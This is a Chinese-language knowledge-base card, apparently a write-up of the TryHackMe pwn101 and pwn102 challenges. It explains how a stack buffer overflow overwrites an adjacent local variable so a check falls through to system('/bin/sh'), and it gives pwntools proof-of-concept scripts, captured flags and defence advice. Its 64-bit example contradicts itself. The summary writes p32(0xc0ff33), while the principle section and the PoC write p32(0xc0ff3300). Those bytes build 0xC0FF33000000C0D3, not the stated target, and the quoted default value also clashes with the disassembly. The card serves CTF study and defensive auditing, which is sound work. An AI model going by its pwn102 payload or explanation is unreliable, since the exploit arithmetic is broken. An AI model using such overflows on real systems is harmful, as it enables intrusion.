---
id: binary-pwn-stack-adjacent-local-variable-overwrite-check-bypass
title: 栈缓冲区溢出覆盖相邻局部变量绕过判断：改 32 位 int 与 64 位魔数让校验走进 system('/bin/sh') 分支
type: scenario
domain: binary
path: binary/pwn/stack
technique: adjacent-local-variable-overwrite-check-bypass
tags:
- pwn
- stack-overflow
- local-variable
- data-only
- check-bypass
- gets
- scanf
- 64bit-immediate
- linux
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V372
  verified_at: '2026-11-09T06:20:38+08:00'
  notes: 已对照原文全文与图01-10核对：pwn101 char v4[60]@rbp-0x40/int v5@rbp-0x4=1337、payload A*60+p32(0)、图05 flag THM{7h4t's_4n_3zy_oveRflowwww}；pwn102 v4[104]@rbp-0x70/__int64 v5@rbp-0x8 目标0xC0FF330000C0D3、两段 p32(0xc0d3)+p32(0xc0ff33)、图09汇编两段mov写入、图10 flag均一致。数据级改写不劫持控制流、64位魔数小端两段写入原理正确；与 stb_image 相邻变量卡/ret2text 卡不同链，dedup=new(最高related 0.886)。未本机复跑二进制；无sources/source_url；CTF二进制--clear；dup-scan(11-08)早于建卡无pair。
url: /docs/binary/pwn/stack/binary-pwn-stack-adjacent-local-variable-overwrite-check-bypass/
draft: false
kb_aliases:
- 变量覆盖绕过
- 覆盖相邻变量
- pwn101 pwn102
- 局部变量改写
- 数据级利用
- 64 位魔数分段写入
---

## 一句话结论

当 `gets`/`scanf("%s")` 的栈缓冲区后面紧邻一个决定分支的局部变量（如 `int v5 = 1337` 或 `__int64 v5 = 0xBADF00DE...`），且该分支会调用 `system("/bin/sh")` 时，不需要覆盖返回地址：按缓冲区到变量的偏移填充，再把变量改成期望值即可让校验走进 shell 分支。原文 pwn101 用 `b"A"*60 + p32(0)` 覆盖 `int v5`，pwn102 用 `b"A"*104 + p32(0xc0d3) + p32(0xc0ff33)` 拼出 64 位魔数 `0xC0FF330000C0D3`。

## 原理

- **栈帧内相邻布局**：编译器通常把局部数组放在低地址、标量变量放在高地址。pwn101 中 `char v4[60]` 位于 `rbp-0x40`、`int v5` 位于 `rbp-0x4`，两者相差 60 字节；pwn102 中 `char v4[104]` 位于 `rbp-0x70`、`__int64 v5` 位于 `rbp-0x8`，相差 104 字节。
- **无边界写入**：`gets(v4)` 与 `scanf("%s", v4)` 都不限制长度，输入超过缓冲区大小后会顺序写入更高地址，正好落进相邻变量。
- **数据级利用（不劫持控制流）**：程序逻辑是 `if (v5 == 1337) exit(); ... system("/bin/sh")`（pwn101）或 `if (v5 != 0xC0FF330000C0D3) exit(); ... system("/bin/sh")`（pwn102）。只需让变量不等于/等于目标值，就能进入 shell 分支，不需要覆盖 return address、也不受 Canary/NX/PIE 影响（只要溢出没有触及 Canary/返回地址）。
- **64 位魔数的写入方式**：x86-64 的立即数 `mov` 一次只能写 32 位，编译器把 64 位初值拆成两条 32 位存储：`[rbp-0x8]=0xfee1dead`、`[rbp-0x4]=0x0badf00d`（小端：低 32 位在低地址）。攻击者按同样布局写 `p32(0x0000c0d3)`（低半）与 `p32(0xc0ff3300)`（高半）即可拼出 `0xC0FF3300_0000C0D3`。
- **为什么能绕过保护**：Full RELRO/NX/PIE 保护的是 GOT、栈执行和代码地址，而本手法只改同一栈帧内的数据，且溢出长度不足以碰到 Canary（若存在）或返回地址；它利用的是业务逻辑对“局部变量不会被外部修改”的错误假设。

## 触发条件

- 程序用无长度限制的 `gets`/`scanf("%s")`/`read` 读入栈缓冲区，且缓冲区与某个决定分支的局部变量在同一栈帧内相邻（偏移可从反汇编确认）。
- 该变量参与的分支最终能到达 `system("/bin/sh")`、`execve`、文件读写或其它高价值操作。
- 溢出长度可控，不会越过 Canary/保存的 RBP/返回地址（或目标无 Canary）；否则会先触发栈保护/崩溃。
- 程序未在读取后对缓冲区做长度/内容校验。

## 利用步骤

1. 反编译/反汇编确定缓冲区与目标变量地址：pwn101 为 `v4 @ rbp-0x40`、`v5 @ rbp-0x4` → 偏移 60；pwn102 为 `v4 @ rbp-0x70`、`v5 @ rbp-0x8` → 偏移 104。
2. 确认目标分支的期望值：pwn101 `v5 != 1337` 才能走到 `system`，所以写入任意不等于 `0x539` 的 4 字节（如 0）；pwn102 要求 `v5 == 0xC0FF330000C0D3`。
3. 构造 payload：`b"A" * 偏移 + 目标值字节`；64 位值按小端拆成低 32 位 + 高 32 位两次写入（注意不要写成 `p64` 整段，否则会继续覆盖 Canary/返回地址，除非目标无 Canary 且允许）。
4. 发送 payload，观察是否打印成功提示并进入 `system("/bin/sh")`。
5. 若失败，用 gdb 在比较指令处断点，检查变量地址与写入偏移是否差 4/8 字节（对齐/编译器差异）。

## PoC

pwn101（32 位 int）：

```python
from pwn import *
sh = process('./pwn101')
sh.sendline(b"A" * 60 + p32(0x0))   # v5 = 0 != 1337 -> system("/bin/sh")
sh.interactive()
```

pwn102（64 位魔数，分两段写）：

```python
from pwn import *
sh = process('./pwn102')
sh.sendline(b"A" * 104 + p32(0x0000c0d3) + p32(0xc0ff3300))  # v5 = 0xC0FF330000C0D3
sh.interactive()
```

原文远程验证：pwn101 拿到 `THM{7h4t's_4n_3zy_oveRflowwww}`，pwn102 拿到 `THM{y3s_1_n33D_C0ff33_to_C0d3_<3}`。

## 变体与关联

- 变体：目标变量为 `char` 标志位、枚举、函数指针；64 位值用 `p64` 一次性写到无 Canary 的栈帧；变量在缓冲区低地址（向下溢出）时改负偏移。
- 关联：[[binary-pwn-stack-stb-image-pic-noise-offbyone-adjacent-variable]]（越界写相邻栈变量改权限值）、[[binary-pwn-stack-ret2text-win-plus-one-align]]（覆盖返回地址跳后门）、[[ctf-pwn-signed-int-wrap-range-check-system]]（另一类判断绕过）。
- 边界：缓冲区与变量之间若有 Canary/对齐填充，偏移会变化；开启 `-fstack-protector-strong` 且变量位于 Canary 之后时，溢出会先破坏 Canary；编译器优化可能把变量放在寄存器中，需按实际反汇编确认。

## 检测与防御

- **代码层**：用 `fgets`/`scanf("%Ns")`/`read` 限制长度；对输入做长度校验；不要把安全判断建立在与缓冲区相邻的局部变量上。
- **编译层**：开启 `-fstack-protector-all`/`-fstack-clash-protection`，但注意 Canary 主要保护返回地址，不能阻止同一帧内相邻变量被覆盖；关键判断应在独立作用域或寄存器/堆中计算。
- **检测**：崩溃/日志中出现超长输入后分支异常走向；对 `gets`、无宽度 `%s`、`read` 长度大于缓冲区等模式做静态审计。
